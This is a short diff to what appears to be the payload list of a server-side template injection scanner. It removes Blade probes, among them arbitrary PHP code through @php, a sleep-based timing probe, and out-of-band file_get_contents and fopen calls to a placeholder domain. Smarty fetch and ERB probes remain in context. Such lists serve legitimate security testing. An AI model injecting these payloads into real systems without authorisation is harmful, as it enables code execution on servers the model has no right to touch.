@@ -61,18 +61,6 @@ PAYLOADS = r"""
 {fetch file="http://{domain}/smarty"}
 {fetch file="http://{domain}/smarty" assign="x"}
 
-##Blade (PHP/Laravel) - Math##
-{{7*191}}
-{!!7*191!!}
-##Blade (PHP/Laravel) - Error##
-{{invalid}}
-{{$undefined->method()}}
-##Blade (PHP/Laravel) - Timing##
-@php sleep(5); @endphp
-##Blade (PHP/Laravel) - OOB##
-@php file_get_contents('http://{domain}/blade') @endphp
-@php fopen('http://{domain}/blade','r') @endphp
-
 ##ERB (Ruby) - Math##
 <%=7*191%>
 <%= 7 * 191 %>
